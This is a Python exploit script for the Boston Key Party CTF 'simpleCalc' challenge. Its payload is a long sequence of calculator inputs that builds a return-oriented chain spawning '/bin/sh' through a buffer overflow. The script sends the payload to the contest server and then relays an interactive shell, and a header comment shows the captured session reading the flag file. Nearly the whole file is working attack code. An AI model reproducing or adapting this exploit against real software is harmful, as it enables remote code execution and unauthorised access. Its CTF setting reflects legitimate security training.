#! /usr/bin/env python


##########################################
#
#	Local Usage:
#		python bkp_simple_calc.py | ./b28b103ea5f1171553554f0127696a18c6d2dcf7
#
#	Server Usage:
#		python bkp_simple_calc.py
#			N.B. Uncomment send, comment print
##########################################

# =>
# ls
# key
# run.sh
# simpleCalc
# simpleCalc_v2
# socat_1.7.2.3-1_amd64.deb
# cat key > /tmp/read.txt
# cat /tmp/read.txt
# BKPCTF{what_is_2015_minus_7547}

import socket
# from pwn import *

# Setting up for remote exploit in future
host = "simplecalc.bostonkey.party"
port = 5400

ret = '''254
2
100
99

2
100
98

2
100
97

2
100
96

2
100
95

2
100
94

2
100
93

2
100
92

2
100
91

2
100
90

2
100
89

2
100
88

2
100
100

2
100
100

2
100
85

2
100
84

2
100
83

2
100
82

2
4201707
100

2
100
100

2
7082180
100

2
100
100

2
4512664
100

2
100
100

2
1852400275
100

2
1752379283
100

2
4657013
100

2
100
100

2
4201707
100

2
100
100

2
7082188
100

2
100
100

2
4310659
100

2
100
100

2
4657013
100

2
100
100

2
4201431
100

2
100
100

2
7082180
100

2
100
100

2
4201707
100

2
100
100

2
7082188
100

2
100
100

2
4422377
100

2
100
100

2
7082188
100

2
100
100

2
4310659
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4602868
100

2
100
100

2
4195564
100

2
100
100

5
''' 
# The second last val is 7097060-100 = address to jump to
# The last 2 vals are the return address (block 19 & 20)
# block 13 and 14 need to be 0 and 0 to not crash free

#print ret

#------------------------------------------------------

# Later to do remote sploiting
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host,port))
client.send(ret)
while True:
	recv_len = 1
	response = ""

	while recv_len:
		data = client.recv(4096)
		recv_len = len(data)
		response += data

		if recv_len <  4096:
			break

	print response,

	buffer = raw_input("")
	buffer += "\n"
	client.send(buffer)

#client.interactive()